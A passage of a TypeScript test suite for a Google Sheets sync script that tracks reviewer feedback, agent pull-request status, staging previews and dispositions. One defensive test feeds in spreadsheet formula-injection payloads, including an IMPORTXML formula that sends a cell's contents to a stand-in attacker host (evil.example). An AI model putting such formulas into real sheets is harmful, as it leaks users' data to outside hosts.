    const t = withConfig(draftTabs(), rows) as Record<string, { id: number; rows: string[][]; prot?: Prot[] }>;
    const fbRows = t["Contributor Feedback"].rows;
    fbRows[0].push("Ready for agent", "Ready for merge");
    fbRows.forEach((r, i) => i && r.push("", ""));
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    const live = () => (t["Contributor Feedback"].prot ?? []).filter((p) => !p.removed);
    expect(live().map((p) => p.col)).toEqual(["Ready for agent", "Ready for merge"]);
    expect(live()[0].editors).toEqual(["owner@x.example", "a@x.example", "b@x.example"]);
    expect(rt2.toasts.some((m) => /left out: not-an-email/.test(m))).toBe(true);
    load(code, rt2.g).refreshAll();
    expect(live()).toHaveLength(2);
    t.Config.rows = t.Config.rows.map((r) => (r[0] === "EDITORS" ? ["EDITORS", ""] : r));
    load(code, rt2.g).refreshAll();
    expect(live()).toHaveLength(2);
    expect(live()[0].editors).toEqual(["owner@x.example"]);
  });

  test("yesAfterCompletion", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const fbRows = t["Contributor Feedback"].rows;
    fbRows[0].push("Ready for agent");
    fbRows.forEach((r, i) => i && r.push(i === 1 ? "Yes" : ""));
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect(rt2.props["ready:CS-004"]).toBe("2026-10-30 23:40Z");
    expect((rt2.written["Contributor Feedback"]["Agentic status"][0][0] as Rich).text.startsWith("Waiting")).toBe(false);
  });

  test("filledRowGetsId", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const fbRows = t["Contributor Feedback"].rows;
    fbRows[0].push("Ready for agent");
    fbRows.forEach((r, i) => i && r.push(""));
    fbRows[3][9] = "No";
    fbRows.push(["", "", "", "", "", "", "", "", "", "Yes"]);
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""], ["CS-006"]]);
  });

  test("instructionsRowAboveHeader", () => {
    const rows = dRows.map((r) => (r[0] === "EDITORS" ? ["EDITORS", "a@x.example"] : r));
    const plain = withConfig(draftTabs(), rows) as Record<string, { id: number; rows: string[][]; prot?: Prot[] }>;
    const keyed = withConfig(draftTabs(), rows) as Record<string, { id: number; rows: string[][]; prot?: Prot[] }>;
    for (const t of [plain, keyed]) {
      t["Contributor Feedback"].rows[0].push("Ready for agent");
      t["Contributor Feedback"].rows.forEach((r, i) => i && r.push(""));
    }
    const fbRows = keyed["Contributor Feedback"].rows;
    fbRows.unshift(["Instructions", ...fbRows[0].slice(1).map(() => "")]);
    const a = runtime(plain), b = runtime(keyed);
    load(code, a.g).refreshAll();
    load(code, b.g).refreshAll();
    expect(b.written["Contributor Feedback"]).toEqual(a.written["Contributor Feedback"]);
    expect((keyed["Contributor Feedback"].prot ?? []).map((p) => [p.col, p.from])).toEqual([["Ready for agent", 3]]);
    // An edit of the legend or header rebuilds everything; one below them, its row.
    const s = load(code, b.g);
    s.markDirty({ range: { getSheet: () => b.sheet("Contributor Feedback"), getRow: () => 2, getNumRows: () => 1 } });
    expect(b.props.rows ?? "").toBe("");
    fbRows[3][2] = "1.1 Global challenges";
    delete b.written["Contributor Feedback"];
    s.markDirty({ range: { getSheet: () => b.sheet("Contributor Feedback"), getRow: () => 4, getNumRows: () => 1 } });
    expect(b.written["Contributor Feedback"]["Selected Sections"][1]).toEqual(["\u2800\u2800\u28001.1 Global challenges"]);
  });

  test("editRebuildsOnlyItsRows", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    // A person picks a section in row 3 (index 1): only that row is rebuilt.
    t["Contributor Feedback"].rows[2][2] = "1.1 Global challenges";
    delete rt2.written["Contributor Feedback"];
    s.markDirty({ range: { getSheet: () => rt2.sheet("Contributor Feedback"), getRow: () => 3, getNumRows: () => 1 } });
    const w = rt2.written["Contributor Feedback"];
    expect(w["Selected Sections"][1]).toEqual(["\u2800\u2800\u28001.1 Global challenges"]);
    expect((w["Section links"][1][0] as Rich).text).toBe("1.1 Global challenges");
    expect(w["Section links"][0]).toBeUndefined();
    expect(rt2.written.TOC).toBeDefined(); // from the first full refresh only
    // Nothing changed: the timer writes nothing.
    delete rt2.written["Contributor Feedback"];
    s.refreshIfDirty();
    expect(rt2.written["Contributor Feedback"]).toBeUndefined();
    // The agent writes CS-004's Agent row through the API (no edit fires): the timer rebuilds row 2 only.
    t.Agent.rows[1][2] = "PR merged";
    s.refreshIfDirty();
    const w2 = rt2.written["Contributor Feedback"];
    expect((w2["Agentic status"][0][0] as Rich).text).toContain("PR merged");
    expect(w2["Agentic status"][1]).toBeUndefined();
  });

  test("staleOnBlueChange", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Contributor Feedback (agent)");
    f.forEach((x, i) => i && x.push(""));
    f[1][9] = "Define it in 1.1";
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(feedbackBasis(f[0], f[1]));
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\nDefine it in 1.1");
    f[1][1] = "Define registry and register";
    s.refreshAll();
    const stale = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\n\u21b3 Where to review.*\nDefine it in 1\.1$/);
    f[1][1] = "Define registry";
    f[1][9] = stale;
    s.refreshAll();
    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\nDefine it in 1.1");
  });

  test("feedbackAgentColumnRead", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Feedback (agent)");
    f.forEach((x, i) => i && x.push(""));
    f[1][9] = "Question for the editor: A or B? Recommended: A";
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(feedbackBasis(f[0], f[1]));
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).not.toMatch(/Stale/);
    f[1][1] = "A new title";
    s.refreshAll();
    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\n\u21b3 Where to review.*\nQuestion for the editor/);
  });

  test("newEmptyColumnNoStale", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Contributor Feedback (agent)");
    f.forEach((x, i) => i && x.push(""));
    const ag = f[0].indexOf("Contributor Feedback (agent)");
    f[1][ag] = "Define it in 1.1";
    // The older basis: every matching column, empty or not.
    const legacy = hashOf(f[0].map((h, i) => [h, String(f[1][i] ?? "").trim()] as const)
      .filter(([h]) => ["Title", "Selected Sections"].includes(h) || (h.startsWith("Contributor Feedback") && h !== "Contributor Feedback (agent)"))
      .map(([h, v]) => `${h}=${h === "Selected Sections" ? v.split(",").map((x) => x.replace(/^[\s\u2800\u2502\u2514]+/, "").trim()).filter(Boolean).join(",") : v}`).join("\n"));
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(legacy);
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    expect(String(T(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]?.[0]?.[0]) ?? "")).not.toMatch(/Stale/);
    // The agent writes the new basis; then a new reviewer's empty column appears.
    t.Agent.rows[1][t.Agent.rows[0].indexOf("Feedback basis (change set)")] = feedbackBasis(f[0], f[1]);
    f[0].splice(ag, 0, "Contributor Feedback (XY)");
    f.slice(1).forEach((x) => x.splice(ag, 0, ""));
    s.refreshAll();
    expect(String(T(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]?.[0]?.[0]) ?? "")).not.toMatch(/Stale/);
  });

  test("staleSetsReadyNoOnce", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Contributor Feedback (agent)", "Ready for agent");
    f.forEach((x, i) => i && x.push("", ""));
    const ag = f[0].indexOf("Contributor Feedback (agent)"), rd = f[0].indexOf("Ready for agent");
    f[1][ag] = "Define it in 1.1";
    f[1][rd] = "Yes";
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(feedbackBasis(f[0].slice(0, ag + 1), f[1].slice(0, ag + 1)));
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]?.["Ready for agent"]).toBeUndefined();
    f[1][1] = "Define registry and register";
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]["Ready for agent"][0][0]).toBe("No");
    // Still stale, and an Editor sets Yes again: it stays.
    f[1][ag] = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
    f[1][rd] = "Yes";
    delete rt2.written["Contributor Feedback"]["Ready for agent"];
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]["Ready for agent"]).toBeUndefined();
  });

  test("stagingStaleWhenPrChanged", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    t.Agent.rows[0].push("Staging built (UTC, change set)");
    t.Agent.rows[1].push("2026-10-30 23:00Z");
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    const st = rt2.written["Contributor Feedback"]["Staging review"][0][0] as Rich;
    expect(st.text).toBe("review \u26a0 stale: built 2026-10-30 23:00Z, PR changed since");
    expect(st.links).toEqual([[0, 6, "https://o.github.io/dth/STAGING/cs-004/en/review/"]]);
    t.Agent.rows[1][7] = "2026-10-30 23:50Z";
    s.refreshAll();
    expect((rt2.written["Contributor Feedback"]["Staging review"][0][0] as Rich).text).toBe("review");
  });

  test("stagingComparesCommits", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const h = t.Agent.rows[0];
    h.push("Staging built (UTC, change set)", "PR head (change set)", "Staging built from (change set)", "Staging deploy (change set)");
    t.Agent.rows[1].push("2026-10-30 23:00Z", "abcdef1234567890", "abcdef1", "deployed");
    const at = (n: string) => h.indexOf(n);
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    // The first line: the QA gate, on the second, has its own test.
    const text = () => (rt2.written["Contributor Feedback"]["Staging review"][0][0] as Rich).text.split("\n")[0];
    // Same commit: no warning, even though Agent completed is later than Staging built.
    s.refreshAll();
    expect(text()).toBe("review");
    t.Agent.rows[1][at("PR head (change set)")] = "1234567aaaa";
    s.refreshAll();
    expect(text()).toBe("review \u26a0 stale: built from abcdef1, PR now at 1234567");
    t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
    t.Agent.rows[1][at("Staging deploy (change set)")] = "pending";
    s.refreshAll();
    expect(text()).toBe("\u23f3 Preview not live yet: Pages is deploying it. The link appears when Pages has deployed it.");
    t.Agent.rows[1][at("Staging deploy (change set)")] = "deploying, expected 2026-10-31 15:20Z";
    s.refreshAll();
    expect(text()).toBe("\u23f3 Preview not live yet: Pages is deploying it, expected live 2026-10-31 15:20Z. The link appears when Pages has deployed it.");
    t.Agent.rows[1][at("Staging deploy (change set)")] = "pushed";
    s.refreshAll();
    expect(text()).toBe("\u23f3 Preview not live yet: on gh-pages, waiting for Pages to deploy. The link appears when Pages has deployed it.");
    t.Agent.rows[1][at("Staging built from (change set)")] = "abcdef1";
    t.Agent.rows[1][at("Staging deploy (change set)")] = "building";
    s.refreshAll();
    expect(text()).toBe("\u23f3 Preview not live yet: building the preview. The link appears when Pages has deployed it.");
    t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
    t.Agent.rows[1][at("Staging deploy (change set)")] = "failed";
    s.refreshAll();
    expect(text()).toBe("review \u26a0 deploy failed");
    t.Agent.rows[1][at("Staging review page (change set)")] = "";
    s.refreshAll();
    expect(text()).toBe("\u26a0 no preview yet: not ready for merge");
  });

  test("pcEditKeptWhenLocked", () => {
    const pc = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
    const rt3 = runtime(withConfig(pcTabs(), pc));
    let free = false;
    rt3.g.LockService = { getDocumentLock: () => ({ tryLock: () => free, releaseLock: () => {} }) };
    const s = load(code, rt3.g);
    rt3.props.dirty = "1";
    s.refreshIfDirty();
    expect(rt3.props.dirty).toBe("1");
    expect(rt3.written["Review Change Sets"]).toBeUndefined();
    free = true;
    s.refreshIfDirty();
    expect(rt3.props.dirty).toBeUndefined();
    expect(rt3.written["Review Change Sets"]).toBeDefined();
  });

  test("dispositionBlurbFromAgent", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Disposition (agent)");
    f.forEach((x, i) => i && x.push(""));
    t.Agent.rows[0].push("Disposition (change set)");
    t.Agent.rows[1].push("Accepted: define registry in 1.1. Noted: style of 1.2.");
    t.Agent.rows.slice(2).forEach((x) => x.push(""));
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect(T(rt2.written["Contributor Feedback"]["Disposition (agent)"][0][0])).toBe("Accepted: define registry in 1.1. Noted: style of 1.2.");
  });

  test("oneDispositionPerComment", () => {
    const fns = new Function("SpreadsheetApp", `${code}\nreturn { dispositionProblems };`)({}) as { dispositionProblems: (t: string, n: string[], h?: Record<string, string>) => string };
    const ok = "Decided (Q1, 2026-10-31): A, by the Editor; gloss it.\nOverall: partly accepted as editorial.\nNo. 136: Accepted. Defined at first use.\nNos. 127 to 129 and 131: Not accepted. Already addressed.\nNo. 130: Noted.";
    expect(fns.dispositionProblems(ok, ["127", "128", "129", "130", "131", "136"])).toBe("");
    expect(fns.dispositionProblems(ok, ["127", "128", "129", "130", "131", "136", "140", "141"])).toBe("\u26a0 No disposition yet for Nos. 140 and 141");
    expect(fns.dispositionProblems("No. 136: Fixed it.", ["136"])).toMatch(/^\u26a0 No. 136: start with one of Accepted/);
    expect(fns.dispositionProblems("No. 9: Noted.\nNo. 136: Accepted.\nNo. 136: Noted.", ["136"])).toBe("\u26a0 No. 9 is not in this change set\n\u26a0 No. 136 has two dispositions");
    // Drawn from the people's Blue Disposition: a different word is flagged;
    // Pending is not a mismatch, but is listed as not yet confirmed.
    expect(fns.dispositionProblems("No. 136: Accepted.\nNo. 137: Noted.", ["136", "137"], { "136": "Noted", "137": "Pending" }))
      .toBe("\u26a0 Not confirmed by the committee (Disposition still Pending): No. 137\n\u26a0 No. 136: Accepted here, Noted in the people's Disposition");
  });

  test("typedTextNeverFormula", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Contributor Feedback (agent)");
    f.forEach((x, i) => i && x.push(""));
    // A stale-flagged proposal whose text is a formula, unflagged by the script.
    f[1][9] = '\u26a0 Stale: the row changed since this proposal; the agent will propose again.\n=IMPORTXML("https://evil.example/?"&A1,"//a")';
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(feedbackBasis(f[0], f[1]));
    f[2][2] = '=HYPERLINK("https://evil.example","x"), 1.1 Global challenges';
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    const w = rt2.written["Contributor Feedback"];
    // The progress line now leads, so the cell cannot start as a formula.
    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
    expect(String(w["Selected Sections"][1][0]).startsWith("'=")).toBe(true);
  });

  test("largePasteRebuildsAll", () => {
    const rt2 = runtime(withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>);
    const s = load(code, rt2.g);
    s.markDirty({ range: { getSheet: () => rt2.sheet("Contributor Feedback"), getRow: () => 2, getNumRows: () => 50000 } });
    expect(rt2.props.rows).toBeUndefined();
    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
  });

  test("filterStatusDrafting", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    t["Contributor Feedback"].rows[0].push("Agentic status (filter)");
    t["Contributor Feedback"].rows.slice(1).forEach((r) => r.push(""));
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect((rt2.written["Contributor Feedback"]["Agentic status (filter)"] as Rich[][]).map((r) => r[0].text)).toEqual(["PR open", "", ""]);
  });

  test("issueAndStatusFromAgent", () => {
    const i = fb.Issue[0][0] as Rich;
    expect(i.text).toBe("dth#12");
    expect(i.links).toEqual([[0, 6, "https://github.com/o/dth/issues/12"]]);
    expect((fb["Agentic status"][0][0] as Rich).text).toBe("dth#40 (PR open, 2026-10-30 23:40Z) · Adds the definition");
    expect((fb.Issue[1][0] as Rich).text).toBe("");
  });

  test("stagingReviewFromAgent", () => {
    expect(fb["Staging review"][0][0]).toEqual({ text: "review", links: [[0, 6, "https://o.github.io/dth/STAGING/cs-004/en/review/"]], bold: [] });
    expect((fb["Staging review"][1][0] as Rich).text).toBe("");
  });

  test("feedbackOrAgentEditRefreshes", () => {
    const rt2 = runtime(withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>);
    const s = load(code, rt2.g);
    s.markDirty({ range: { getSheet: () => rt2.sheet("Config") } });
    expect(rt2.written["Contributor Feedback"]).toBeUndefined();
    s.markDirty({ range: { getSheet: () => rt2.sheet("Contributor Feedback") } });
    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
    expect(rt2.props.dirty).toBeUndefined();
  });

  test("agentColumnNotPeoplesFeedback", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const r = t["Contributor Feedback"].rows;
    r[0].push("Contributor Feedback (agent)");
    r.forEach((x, i) => i && x.push(""));
    r[3][9] = "Proposal";
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
  });
});

describe('a "2:" basis: a proposal also goes stale on the grey content its comments join (#348)', () => {
  const pcRows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
  const exact = ["Title", "TWG (CS)"];
  const hdr = ["Change-set", "Title", "TWG (CS)", "Suggested Revisions", "TWG (PCs)", "Agentic status", "Committee Feedback (CL)", "Change Set Feedback (agent)", "Ready for agent"];
  const run = (row: string[], basis: string) => {
    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    t["Review Change Sets"].rows = [hdr, row];
    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
    t["Agent - Change Sets"].rows[1].push(basis);
    const rt = runtime(t);
    load(code, rt.g).refreshAll();
    const w = rt.written["Review Change Sets"]?.["Change Set Feedback (agent)"];
    return w ? String(T(w[0][0])) : row[7];
  };
  const base = () => ["CS-001", "Fix scope", "TWG 1", "No. 1 · Lengthen it", "Editorial", "Working", "do it", "Proposal", "No"];

  test("greyBasisStaleOnJoinedCell", () => {
    const basis = feedbackBasis(hdr, base(), exact, "Committee Feedback", PC_BASIS_GREY);
    expect(basis).toMatch(/^2:/);
    expect(run(base(), basis)).not.toMatch(/⚠ Stale/);
    const moved = base();
    moved[3] = "No. 1 · Lengthen it, and add an example";
    expect(run(moved, basis)).toMatch(/^⚠ Stale: /);
  });

  test("greyBasisIgnoresAgentColumns", () => {
    const basis = feedbackBasis(hdr, base(), exact, "Committee Feedback", PC_BASIS_GREY);
    const row = base();
    row[5] = "PR open";
    expect(run(row, basis)).not.toMatch(/⚠ Stale/);
  });

  test("olderBasisIgnoresGrey", () => {
    const basis = feedbackBasis(hdr, base(), exact, "Committee Feedback");
    const grey = base();
    grey[3] = "changed";
    expect(run(grey, basis)).not.toMatch(/⚠ Stale/);
    const blue = base();
    blue[6] = "do it differently";
    expect(run(blue, basis)).toMatch(/^⚠ Stale: /);
  });
});

describe("sheet-sync URLs relative to the folio's site", () => {
  test("urlsResolveAgainstIriBase", () => {
    const repo = draftFolio();
    writeFileSync(join(repo, "doc.json"), JSON.stringify({ instance: "doc", iriBase: "https://who.example/doc" }));
    writeFileSync(join(repo, "review/drafting/sheet-sync.json"), JSON.stringify({ mode: "drafting", anchors: "anchors.json", sectionUrl: "en/doc/#" }));
    expect(buildConfig(repo, "review/drafting/sheet-sync.json").CFG.SECTION_URL).toBe("https://who.example/doc/en/doc/#");
  });

  test("absoluteKeptRelativeNeedsBase", () => {
    const repo = draftFolio();
    expect(buildConfig(repo, "review/drafting/sheet-sync.json").CFG.SECTION_URL).toBe("https://x.example/S#");
    writeFileSync(join(repo, "review/drafting/sheet-sync.json"), JSON.stringify({ mode: "drafting", anchors: "anchors.json", sectionUrl: "en/doc/#" }));
    expect(() => buildConfig(repo, "review/drafting/sheet-sync.json")).toThrow(/declares no iriBase/);
  });
});

describe("the Config tab's rows", () => {
  const c = buildConfig(draftFolio(), "review/drafting/sheet-sync.json");
  const rows = configRows(c);
  const joined = (k: string) => rows.filter((r) => r[0] === k).map((r) => r[1].replace(/^\|/, "")).join("");

  test("configRowsReadableJson", () => {
    expect(rows.find((r) => r[0] === "CFG")?.[1]).toContain('\n  "MODE": "drafting"');
    for (const k of ["CFG", "COLS", "DATA"] as const) expect(JSON.parse(joined(k))).toEqual(JSON.parse(JSON.stringify(c[k])));
  });

  test("longValueCutBetweenLines", () => {
    const big = JSON.stringify({ xs: Array.from({ length: 6000 }, (_, i) => `section ${i} ${"x".repeat(10)}`) }, null, 2);
    const parts = chunks(big);
    expect(parts.length).toBeGreaterThan(1);
    expect(parts.every((p) => p.length <= 40_000)).toBe(true);
    expect(parts.slice(1).every((p) => p.startsWith("    \"section"))).toBe(true);
    expect(parts.every((p) => p.split("\n").length <= 40)).toBe(true);
    expect(JSON.parse(parts.join(""))).toEqual(JSON.parse(big));
  });

  test("readableShortListsOneLine", () => {
    const v = { a: [["Ch 1", "#c1"], ["1.1", "#s1"]], b: { c: [1, 2], d: null }, e: [], f: {} };
    expect(readable(v)).toContain('[["Ch 1","#c1"],["1.1","#s1"]]');
    expect(JSON.parse(readable(v))).toEqual(v);
    expect(JSON.parse(readable(c.DATA))).toEqual(JSON.parse(JSON.stringify(c.DATA)));
  });

  test("oneLongLineStillCut", () => {
    const one = JSON.stringify({ s: "y".repeat(90_000) });
    const parts = chunks(one);
    expect(parts.length).toBe(3);
    expect(JSON.parse(parts.join(""))).toEqual(JSON.parse(one));
  });
});

describe("the colour key in Instructions text", () => {
  const keyRuns = new Function("SpreadsheetApp", `${code}\nreturn keyRuns;`)({}) as (t: string, h?: Record<string, string>) => [number, number, string][];
  const fillGroup = new Function("SpreadsheetApp", `${code}\nreturn fillGroup;`)({}) as (h: string) => string | null;
  const text = tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json"))["Review Change Sets"];
  const heads = { "Ready for agent": "orange", "Ready for merge": "orange", "Agentic status": "green", "Agentic status (filter)": "green", "Committee Feedback": "blue", "Disposition": "blue", "Staging review": "green" };
  const runs = keyRuns(text, heads);
  const words = runs.map(([a, z, c]) => [text.slice(a, z), c]);

  test("keyPhrasesColouredWhole", () => {
    expect(words[0][0]).toBe("the Feedback Review Committee");
    expect(words[1][0]).toBe("the agent");
    expect(new Set(words.slice(0, 4).map(([, c]) => c)).size).toBe(4);
  });

  test("columnNamesColouredLikeHeader", () => {
    const later = words.slice(4);
    for (const [, c] of later) expect(["#1f5fa8", "#2e7d32", "#c25e00", "#666666"]).toContain(c);
    expect(later).toContainEqual(["Ready for agent", "#c25e00"]);
    expect(later).toContainEqual(["Ready for merge", "#c25e00"]);
    expect(later).toContainEqual(["Committee Feedback", "#1f5fa8"]);
    expect(later).toContainEqual(["Agentic status", "#2e7d32"]);
    // No overlapping runs.
    for (let i = 1; i < runs.length; i++) expect(runs[i][0]).toBeGreaterThanOrEqual(runs[i - 1][1]);
  });

  test("headerFillsMapToKey", () => {
    expect(fillGroup("#9dc3e7")).toBe("blue");
    expect(fillGroup("#f4b16a")).toBe("orange");
    expect(fillGroup("#93c27c")).toBe("green");
    expect(fillGroup("#b6b6b6")).toBe("grey");
    expect(fillGroup("#ffffff")).toBe(null);
  });

  test("plainTextNoRuns", () => {
    expect(keyRuns("Kept by the agent's watcher. Do not edit.", heads)).toEqual([]);
  });
});

describe("a copy that is not linked to a repository yet", () => {
  test("unlinkedCopySaysSo", () => {
    const t = { ...tabs(), Config: { id: 900, rows: [["Key", "Value"], ["EDITORS", ""]] } };
    const rt = runtime(t);
    expect(() => load(code, rt.g).refreshAll()).toThrow(/^Ask the agent to link this sheet.*copy-sheet-id/);
  });

  test("toastLeadsShort", () => {
    const toast = code.match(/ss\.toast\('(Ask the agent to link[^']*)'/)?.[1];
    expect(toast).toBeDefined();
    expect(toast!.length).toBeLessThan(100);
  });

  /** A spreadsheet with one people's tab whose first Instructions cell is `text`. */
  const setupSheet = (text: string, cfg?: Record<string, string>) => {
    const cell = { v: text };
    const tab = {
      getName: () => "Contributor Feedback", isSheetHidden: () => false, getLastRow: () => 2, getLastColumn: () => 3,
      getRange: (_r: number, c: number) => ({
        getDisplayValue: () => (c === 1 ? "Instructions" : cell.v),
        setValue: (v: string) => { cell.v = v; },
      }),
    };
    const fn = new Function("SpreadsheetApp", "LockService", "PropertiesService", "Utilities", "ScriptApp", "Session",
      `${code}\nCFG = ${JSON.stringify(cfg ?? null)};\nreturn { markSetup };`);
    const { markSetup } = fn({}, {}, {}, {}, {}, {}) as { markSetup(ss: unknown, state: string): void };
    return { cell, run: (state: string) => markSetup({ getSheets: () => [tab] }, state) };
  };
  const sites = { SITE_URL: "https://o.github.io/dth/", REPO_URL: "https://github.com/o/dth" };

  test("unlinkedFirstLineOnce", () => {
    const s = setupSheet("Blue = your input\nsteps");
    s.run("unlinked");
    s.run("unlinked");
    expect(s.cell.v.split("\n")[0]).toMatch(/^\u26a0 Not set up yet\. Step 1 of 2: ask the agent to link this sheet/);
    expect(s.cell.v.split("\n").filter((l) => l.startsWith("\u26a0")).length).toBe(1);
    expect(s.cell.v).toContain("Blue = your input\nsteps");
  });

  test("linkedUninstalledInstallStep", () => {
    const s = setupSheet("\u26a0 Not set up yet. Step 1 of 2: ...\nBlue = your input", sites);
    s.run("uninstalled");
    expect(s.cell.v.split("\n")[0]).toMatch(/^\u26a0 Almost set up\. Step 2 of 2: choose Folio Assistant, then Install/);
  });

  test("installedShowsLinks", () => {
    const s = setupSheet("\u26a0 Almost set up. Step 2 of 2\nBlue = your input", sites);
    s.run("ready");
    s.run("ready");
    expect(s.cell.v).toBe("Blue = your input\nDocument: https://o.github.io/dth/   Repository: https://github.com/o/dth\n" +
      "More about Folio Assistant: https://litlfred.github.io/folio-assistant/");
  });
});

describe("the colour key under a setup line", () => {
  test("colourKeyUnderSetupLine", () => {
    const fn = new Function("SpreadsheetApp", `${code}\nreturn { keyRuns };`);
    const { keyRuns } = fn({}) as { keyRuns(t: string): [number, number, string][] };
    const key = "Blue = your input     Green = the agent";
    const plain = keyRuns(key);
    const under = keyRuns("\u26a0 Not set up yet. Step 1 of 2: ask\n" + key);
    const shift = "\u26a0 Not set up yet. Step 1 of 2: ask\n".length;
    expect(under.slice(0, 2)).toEqual(plain.slice(0, 2).map(([a, z, c]) => [a + shift, z + shift, c]));
  });
});

describe("linking a copied template (owner, 2026-11-01: make it mechanical)", () => {
  test("sheetIdFromLinkOrId", () => {
    const id = "1ACmiSvHK2kYlqaL0--p2u4Op7g4R1_BzgNFuW7QUs3Y";
    expect(sheetIdOf(`https://docs.google.com/spreadsheets/d/${id}/edit?gid=0#gid=0`)).toBe(id);
    expect(sheetIdOf(id)).toBe(id);
    expect(() => sheetIdOf("not a sheet")).toThrow();
  });

  test("pagesSiteNamesRepo", () => {
    expect(repoOfSite("https://litlfred.github.io/dth-phc/")).toBe("https://github.com/litlfred/dth-phc");
    expect(repoOfSite("https://example.org/dth/")).toBeUndefined();
    expect(repoOfSite(undefined)).toBeUndefined();
  });

  test("draftingSheetSyncFromName", () => {
    expect(draftingSheetSync("dth-phc", "https://docs.google.com/spreadsheets/d/1ACmiSvHK2kYlqaL0--p2u4Op7g4R1_BzgNFuW7QUs3Y/edit"))
      .toEqual({ mode: "drafting", anchors: "folio/dth-phc/review-anchors.json", sectionUrl: "en/dth-phc/#", sheet: "1ACmiSvHK2kYlqaL0--p2u4Op7g4R1_BzgNFuW7QUs3Y" });
  });

  test("configShowsSiteRepoSettings", () => {
    const repo = draftFolio();
    writeFileSync(join(repo, "dth.json"), JSON.stringify({ iriBase: "https://o.github.io/dth/" }));
    const c = buildConfig(repo, "review/drafting/sheet-sync.json");
    expect(c.CFG.SITE_URL).toBe("https://o.github.io/dth/");
    expect(c.CFG.REPO_URL).toBe("https://github.com/o/dth");
